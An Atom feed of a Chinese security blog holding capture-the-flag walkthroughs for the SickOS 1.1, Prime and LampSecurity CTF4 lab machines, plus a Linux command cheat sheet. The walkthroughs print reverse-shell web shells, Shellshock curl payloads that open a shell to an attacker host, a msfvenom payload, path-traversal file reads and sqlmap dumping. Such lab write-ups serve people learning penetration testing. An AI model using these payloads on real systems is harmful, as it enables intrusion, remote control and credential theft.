<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ljxxxxx</title>
  
  <subtitle>宏愿纵未了 奋斗总不太晚</subtitle>
  <link href="http://ljx-go.top/atom.xml" rel="self"/>
  
  <link href="http://ljx-go.top/"/>
  <updated>2023-03-14T16:51:05.162Z</updated>
  <id>http://ljx-go.top/</id>
  
  <author>
    <name>ljxxxxx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/SickOS/"/>
    <id>http://ljx-go.top/2023/04/08/SickOS/</id>
    <published>2023-04-08T12:47:51.686Z</published>
    <updated>2023-03-14T16:51:05.162Z</updated>
    
    <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ABOUT RELEASE</span><br><span class="line">Name........: SickOs1.1</span><br><span class="line">Date Release: 11 Dec 2015</span><br><span class="line">Author......: D4rk</span><br><span class="line">Series......: SickOs</span><br><span class="line">Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">Tester(s)...: h1tch1</span><br><span class="line">Twitter.....: https://twitter.com/D4rk36</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>IP地址 192.168.37.140</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312222911204.png" alt="image-20230312222911204" style="zoom: 67%;" /><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224029714.png" alt="image-20230312224029714"></p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224236606.png" alt="image-20230312224236606"></p><p>发现端口22 3128 8080</p><p>其中8080端口未开启</p><p>经过两次nmap漏洞扫描并未发现其他信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312224524062.png" alt="image-20230312224524062"></p><p>访问3128端口与8080端口结果如下</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312225858677.png" alt="image-20230312225858677" style="zoom:67%;" /><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230312225908889.png" alt="image-20230312225908889" style="zoom:67%;" /><p>结果都显示3128端口的服务框架为squid，上网搜寻squid的相关信息</p><blockquote><p><a href="https://www.open-open.com/misc/goto?guid=4958185427613467036">Squid cache</a>（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络 安全，到局域网通过DL上网。Squid主要设计用于在Unix一类系统运行。</p></blockquote><p>在此猜测，访问80端口须走3128端口代理</p><h3 id="Squid代理设置"><a href="#Squid代理设置" class="headerlink" title="Squid代理设置"></a>Squid代理设置</h3><p>通过这个思路 我们可以对靶机进行目录爆破 在爆破的同时加入代理服务器</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003151041.png" alt="image-20230313003151041" style="zoom:67%;" /><p>通过浏览器访问前设置proxy代理</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003529361.png" alt="image-20230313003529361" style="zoom:50%;" /><h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><p>访问robots.txt</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003627827.png" alt="image-20230313003627827"></p><p>访问&#x2F;wolfcms目录</p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313003729450.png" alt="image-20230313003729450" style="zoom:67%;" /><p>通过谷歌关键词搜索后台登陆地址</p><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313011138489.png" alt="image-20230313011138489"></p><p>成功访问后台登陆地址，是一个登陆界面。面对该登陆界面有以下三种思路</p><ul><li>1.弱密码</li><li>2.默认账号</li><li>3.暴力破解</li></ul><p><img src="http://42.193.172.120:8088/images/2023/03/12/image-20230313011207583.png" alt="image-20230313011207583"></p><p>经过弱密码尝试后，用 <code>admin/admin</code>成功登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314003826611.png" alt="image-20230314003826611"></p><p>发现有很多文件内容都是用php脚本来执行，同时也存在文件上传的入口</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314003944203.png" alt="image-20230314003944203"></p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314004000255.png" alt="image-20230314004000255"></p><p>尝试在Articles中插入一句话木马。</p><p><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39;&quot;);?&gt;</code></p><p>在点击Articles时成功反弹shell</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314004524690.png" alt="image-20230314004524690"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看网站配置文件config.php</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314005652091.png" alt="image-20230314005652091"></p><p>获得数据库账号密码 <code>root/john@123</code></p><p>查看&#x2F;etc&#x2F;passwd文件，获得靶机的相关用户及其权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103710896.png" alt="image-20230314103710896"></p><p>尝试用着数据库的账号密码 对靶机ssh连接</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103909232.png" alt="image-20230314103909232"></p><p>成功ssh连接获得sickos账户</p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314103954962.png" alt="image-20230314103954962"></p><p><img src="http://42.193.172.120:8088/images/2023/03/13/image-20230314105247196.png" alt="image-20230314105247196"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用Nikto 发现shellshock漏洞</p><p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p><blockquote><p><strong>nikto常用命令</strong><br>-upodate                           升级，更新插件</p><p>-host                                  扫描目标URl</p><p>-id username:password   http认证接口</p><p>-list-plugins                      列出所有可用的插件</p><p>-evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）</p><p>-port                                指定端口（默认80）</p><p> -ssl                                 使用SSL</p><p>-useproxy                       使用http代理</p><p>-vhost  域名                    当一个IP拥有多个网站时 使用</p><p><strong>nikto交互参数（扫描过程中使用）</strong><br>空格        报告当前扫描状态</p><p>v             显示详细信息</p><p>d             显示调试信息</p><p>e             显示http错误信息</p><p>p             显示扫描进度</p><p>r              显示重定向信息</p><p>c             显示cookie</p><p>a             显示身份认证过程</p><p>q             退出程序</p><p>N            扫描下一个目标</p><p>P            暂停扫描</p></blockquote><p><code>nikto -h 192.168.37.140 -useproxy 192.168.37.140:3128</code>    注意此处需要挂代理</p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230314235545518.png" alt="image-20230314235545518"></p><blockquote><p><strong>漏洞原因</strong></p><p>bash使用的环境变量是通过函数名称来调用的，以”<code>()&#123;</code>“开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “<code>&#125;</code>” 为结束，而是执行其后的恶意shell命令</p></blockquote><p><strong>检查漏洞</strong></p><p><code>curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :;&#125;;echo;/usr/bin/whoami&quot; http://192.168.37.140/cgi-bin/status</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315000417335.png" alt="image-20230315000417335"></p><p><strong>反弹shell</strong></p><p><code>curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&quot; http://192.168.37.140//cgi-bin/status</code></p><blockquote><p>小tips</p><p>当获得的shell的交互性比较差可以用使用 python 的 pty 来转换为 交互式shell</p><p><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p></blockquote><p><strong>查看网站根目录文件</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315002609547.png" alt="image-20230315002609547"></p><p>通过查看定时任务cron提权  </p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315003441880.png" alt="image-20230315003441880"></p><p>在过滤关键字cron中获得多个定时任务有关的文件夹，其中在cron.d中的automate中发现存在一个定时任务每个一分钟执行网站根目录下的python文件，因此可以通过执行python脚本来反弹shell，进一步提权</p><p>使用msfvenom生成shell</p><p><a href="https://blog.51cto.com/yyxianren/5720367">msfvenom参数简介</a>    <a href="https://blog.csdn.net/m0_64444909/article/details/126841128">利用msfvenom制作木马，并且反弹shell</a></p><p><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.37.135 LPORT=7778 -f raw</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315004656083.png" alt="image-20230315004656083"></p><p><img src="http://42.193.172.120:8088/images/2023/03/14/image-20230315004806042.png" alt="image-20230315004806042"></p><p>成功获得目标！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/Prime/"/>
    <id>http://ljx-go.top/2023/04/08/Prime/</id>
    <published>2023-04-08T12:47:51.678Z</published>
    <updated>2023-03-28T13:04:51.639Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><blockquote><p>This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.</p><p>This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox’s machines are designed.</p><p>So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed</p><p>Visit our website <a href="http://hacknpentest.com/">http://hacknpentest.com</a> and <a href="http://hnpsecurity.com/">http://hnpsecurity.com</a>.</p></blockquote><p><strong>靶机IP</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315130246204.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><code>sudo nmap --min-rate 10000 -p- 192.168.37.138</code></p><p><code>sudo nmap -sT -sV -O -p22,80  192.168.37.138</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315130505547.png" alt="image-20230315130505547"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>dirsearch -u 192.168.37.138 -e * -x 403</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144425580.png" alt="image-20230315144425580"></p><h4 id="x2F-dev"><a href="#x2F-dev" class="headerlink" title="&#x2F;dev"></a>&#x2F;dev</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144436401.png" alt="image-20230315144436401"></p><p>这是一个提示，我们通过扫描获得该提示，那说明我们再深度扫描一下</p><h4 id="x2F-wordpress-x2F-wp-login-php"><a href="#x2F-wordpress-x2F-wp-login-php" class="headerlink" title="&#x2F;wordpress&#x2F;wp-login.php"></a>&#x2F;wordpress&#x2F;wp-login.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144454527.png" alt="image-20230315144454527"></p><p>wordpress的后台登陆系统</p><h4 id="x2F-wordpress"><a href="#x2F-wordpress" class="headerlink" title="&#x2F;wordpress"></a>&#x2F;wordpress</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315144531119.png" alt="image-20230315144531119"></p><p>wordpress框架</p><p>用dirb 再次扫描  <code>dirb http://192.168.37.138 -X .txt,.zip</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315151948348.png" alt="image-20230315151948348"></p><h4 id="x2F-secret-txt"><a href="#x2F-secret-txt" class="headerlink" title="&#x2F;secret.txt"></a>&#x2F;secret.txt</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315152030249.png" alt="image-20230315152030249"></p><p>这个提示告诉我需要对已找到的php页面进行模糊测试，找到一个正确的参数，同时这里也出现了一个location.txt需要我们去查看</p><p>其中给了个链接， 该链接是一个kali自带的用于模糊测试的工具 <code>wfuzz</code></p><p><code>dirb http://192.168.37.138 -X .php</code></p><p>寻找php页面</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315153524253.png" alt="image-20230315153524253"></p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><h4 id="x2F-image-php"><a href="#x2F-image-php" class="headerlink" title="&#x2F;image.php"></a>&#x2F;image.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315155156090.png" alt="image-20230315155156090"></p><h4 id="x2F-index-php"><a href="#x2F-index-php" class="headerlink" title="&#x2F;index.php"></a>&#x2F;index.php</h4><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315155244206.png" alt=" "></p><p>获得参数file</p><p>访问file</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315160546053.png" alt="image-20230315160546053"></p><p>提示参数的内容不正确，尝试前面提示的location.txt文件</p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315161439318.png" alt="image-20230315161439318"></p><p>出现另一个参数<code>secrettier360</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/15/image-20230315161822628.png" alt="image-20230315161822628"></p><p>该参数是image.php上的参数，这里应该是一个本地文件包含漏洞</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>curl  http://192.168.37.138/image.php?secrettier360=../../../../../../etc/passwd</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/21/image-20230321144624395.png" alt="image-20230321144624395"></p><p>根据提示查看password.txt文件</p><p><code>curl  http://192.168.37.138/image.php?secrettier360=../../../../../../home/saket/password.txt</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322185944244.png" alt="image-20230322185944244"></p><p>拿到一个密码 follow_the_ippsec，尝试ssh连接，均失败。</p><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><blockquote><p><strong>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</strong></p></blockquote><p><code>wpscan --url http://192.168.37.138/wordpress -e u</code></p><p>已知一个密码，此时思路是-e参数枚举wordpress后台用户名，获得用户名victor</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322194728822.png" alt="image-20230322194728822"></p><p>成功登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322195639260.png" alt="image-20230322195639260"></p><p>登陆wordpress后台后，通常的思路是查看Plugins是否允许插入插件orAppearance&#x2F;Theme Editor处是否有可写权限的脚本文件</p><p>创建一个zip文件尝试上传，此路不通</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322201902573.png" alt="image-20230322201902573"></p><p>在Theme Editor发现可修改secret.php文件，写入一句话木马反弹shell</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322202228133.png" alt="image-20230322202228133"></p><p><code>&lt;?php &quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39; &quot;?&gt;</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322202729914.png" alt="image-20230322202729914"></p><p>接下来就是寻找secret.php文件的路径</p><blockquote><p>WordPress主题存放在 “wp-content&#x2F;themes&#x2F;” 这个文件夹中，我们可以看到各自默认有几个主题文件夹，里面包含了所有的主题目录，并存储为一个目录。每个目录名称通常是一个主题名称。如果我们有需要添加新主题可以将主题的文件夹传到这个目录，然后在后台的外观主题可以激活设置当前主题。</p></blockquote><p>&#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;secret.php </p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322203406131.png" alt="image-20230322203406131"></p><p>得到反弹shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322203854460.png" alt="image-20230322203854460"></p><p>提示了&#x2F;home&#x2F;saket&#x2F;目录</p><p>user.txt中存放密文，用md5解密无果，enc是一个可执行文件，执行时需要输入密码</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322213605210.png" alt="image-20230322213605210"></p><p>此处我们可以通过find命令搜索backup文件  （backup文件会有一些关键信息）</p><p><code>find / -name &#39;*backup*&#39; 2&gt;/dev/null | sort | less</code></p><blockquote><p>忽略错误输出 使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中，从而忽略错误输出。</p><p>在Linux系统中，每个进程都有三个标准文件描述符：标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。这些文件描述符分别对应于文件描述符0、1和2。</p><p>当我们使用Linux命令时，它们通常会将标准输出和标准错误分别输出到终端，以便我们可以看到它们的输出结果。但是，有时候我们可能不希望看到标准错误的输出信息，可以通过将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。</p><p>在命令中，“2”代表标准错误的文件描述符，”&gt;”代表重定向操作符，”&#x2F;dev&#x2F;null”代表一个特殊的设备文件，用于将所有数据丢弃而不保存。</p><p>因此，使用“2&gt;&#x2F;dev&#x2F;null”将错误信息输出到“&#x2F;dev&#x2F;null”设备中的意思是将标准错误输出重定向到“&#x2F;dev&#x2F;null”设备中，从而将其忽略掉。</p></blockquote><p>找到opt&#x2F;backup&#x2F;server_database&#x2F;backup_pass<img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214027888.png" alt="image-20230322214027888"></p><p>获得 密码：<strong>backup_password</strong></p><p>成功运行enc文件生成密钥密文文件</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214218148.png" alt="image-20230322214218148"></p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214602948.png" alt="image-20230322214602948"></p><p>提示用md5加密ippsec作为密码解密enc.txt</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322214548296.png" alt="image-20230322214548296"></p><p><strong>366a74cb3c959de17d61db30591c39d1</strong></p><p>此处也可以用echo与md5sum进行md5加密——但要注意需要-n来取消字符串的换行符，否则加密会有误</p><p><img src="http://42.193.172.120:8088/images/2023/03/27/image-20230328010851938.png" alt="image-20230328010851938"></p><p>利用openssl解密</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328201505755.png" alt="image-20230328201505755"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat txt);do echo &#x27;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&#x27; | openssl enc -d -a -K &#x27;33363661373463623363393539646531376436316462333035393163333964310a&#x27; -$i 2&gt;/dev/null; echo $i; done</span><br></pre></td></tr></table></figure><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328203725787.png" alt="image-20230328203725787"></p><p>最后解密的saket用户的密码为tribute_to_ippsec</p><p>切换账户并查看权限<img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230322215242922.png" alt="image-20230322215242922"></p><p>执行提示的文件 &#x2F;home&#x2F;victor&#x2F;undefeated_victor<img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215223805.png" alt="image-20230322215223805"></p><p>提示没找到challenge文件，尝试创建challenge文件并写入“&#x2F;bin&#x2F;bash”</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215551337.png" alt="image-20230322215551337"></p><p>成功获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/22/image-20230322215633795.png" alt="image-20230322215633795"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;靶机介绍&quot;&gt;&lt;a href=&quot;#靶机介绍&quot; class=&quot;headerlink&quot; title=&quot;靶机介绍&quot;&gt;&lt;/a&gt;靶机介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine is designed for those one who is try</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/linux/"/>
    <id>http://ljx-go.top/2023/04/08/linux/</id>
    <published>2023-04-08T12:47:51.673Z</published>
    <updated>2023-04-01T16:59:32.101Z</updated>
    
    <content type="html"><![CDATA[<p>linux命令</p><h2 id="locate-ksubdomain"><a href="#locate-ksubdomain" class="headerlink" title="locate ksubdomain"></a><code>locate ksubdomain</code></h2><p><img src="http://42.193.172.120:8088/images/2023/02/23/image-20230223170816676.png" alt="image-20230223170816676"></p><h2 id="hash-identifier-01ec2d8fc11c493b25029fb1f47f39ce"><a href="#hash-identifier-01ec2d8fc11c493b25029fb1f47f39ce" class="headerlink" title="hash-identifier  01ec2d8fc11c493b25029fb1f47f39ce"></a><code>hash-identifier  01ec2d8fc11c493b25029fb1f47f39ce</code></h2><p>识别加密方式</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004040372.png" alt="image-20230307004040372"></p><p><code>echo &#39;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#39; | base64 -d</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004449879.png" alt="image-20230307004449879"></p><p>犯病突然连不上网</p><p><a href="https://blog.csdn.net/anlr2020/article/details/118414371">VMware 中kali使用NAT无法连接网络</a></p><h2 id="dpkg"><a href="#dpkg" class="headerlink" title="dpkg"></a>dpkg</h2><p>dpkg  -l：显示于软件包关联的文件</p><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p><strong><a href="https://blog.51cto.com/yyxianren/5720367">msfvenom参数简介</a></strong></p><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p><code>sudo php -S 0:80</code>开启web服务器80端口</p><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>awk的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;pattern &#123; action &#125;&#x27; input-file</span><br></pre></td></tr></table></figure><p>awk -F’:’ ‘{print$1}’</p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>wc -l 查看有什么行内容</p><h2 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h2><p>将重复的内容过滤掉</p><h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p>tr -d ‘\n’  删除换行符</p><h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>xxd -p 将字符串转换成16进制 </p><h2 id="chown-x2F-chgrp"><a href="#chown-x2F-chgrp" class="headerlink" title="chown&#x2F;chgrp"></a>chown&#x2F;chgrp</h2><p>修改文件的所有者&#x2F;所属组</p><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><p>创建空文件或更新已有文件的访问和修改时间戳</p><h2 id="sed-‘s-x2F-x2F-x2F-g’"><a href="#sed-‘s-x2F-x2F-x2F-g’" class="headerlink" title="sed ‘s&#x2F; &#x2F;:&#x2F;g’"></a><strong>sed ‘s&#x2F; &#x2F;:&#x2F;g’</strong></h2><p>这是一个Sed的替换命令，用于将文本中所有的空格（” “）替换为冒号（”:”）。</p><p>“s”是替换（substitute）命令的缩写</p><p>“g”表示全局匹配（即替换所有匹配到的字符串，而不只是第一个）</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>cp 文件路径 .</p><p>.表示当前路径</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;linux命令&lt;/p&gt;
&lt;h2 id=&quot;locate-ksubdomain&quot;&gt;&lt;a href=&quot;#locate-ksubdomain&quot; class=&quot;headerlink&quot; title=&quot;locate ksubdomain&quot;&gt;&lt;/a&gt;&lt;code&gt;locate ksubdom</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/LampSecurityCTF4/"/>
    <id>http://ljx-go.top/2023/04/08/LampSecurityCTF4/</id>
    <published>2023-04-08T12:47:51.669Z</published>
    <updated>2023-03-28T16:15:05.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LampSecurityCTF4"><a href="#LampSecurityCTF4" class="headerlink" title="LampSecurityCTF4"></a>LampSecurityCTF4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><code>sudo nmap -sn 192.168.37.0/24</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230552578.png" alt="image-20230328230552578"></p><p>主机IP：192.168.37.148</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>sudo nmap --min-rate=10000 -p- 192.168.37.148</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230712302.png" alt="image-20230328230712302"></p><p><code>sudo nmap -sT -sV -O -p22,25,80,631 192.168.37.148</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328230824664.png" alt="image-20230328230824664"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328232343871.png" alt="image-20230328232343871"></p><p><code>robots.txt</code>中显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /mail/</span><br><span class="line">Disallow: /restricted/</span><br><span class="line">Disallow: /conf/</span><br><span class="line">Disallow: /sql/</span><br><span class="line">Disallow: /admin/</span><br></pre></td></tr></table></figure><p><code>/conf/</code>访问报错,<code>/restricted/</code>,<code>/mail/</code>,<code>/admin/</code>都需要登录</p><p><code>/sql/</code>目录可以直接查看,<code>/sql/db.sql</code>可以被直接访问,内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use ehks;</span><br><span class="line">create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);</span><br><span class="line">create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);</span><br><span class="line">create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;pages是一个目录，有blog.php等文件，与前端的页面内容一致，可能存在路径穿越</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328235139390.png" alt="image-20230328235139390"></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328235201903.png" alt="image-20230328235201903"></p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328232318993.png" alt="image-20230328232318993"></p><p>在测试中发现sql注入点</p><p>利用sqlmap获得数据库内容</p><p><code>sqlmap -u &#39;http://192.168.37.148/index.html?page=blog&amp;title=Blog&amp;id=2&#39; --dbs --dump --batch</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230328234736065.png" alt="image-20230328234736065"></p><p>均可进入<code>/admin/</code>后台,测试同样可以作为ssh连接并提权到<code>root</code></p><p>在SSH连接时出现该错误，对其补足参数</p><p><code>sudo ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss pmoore@192.168.37.148</code></p><p><img 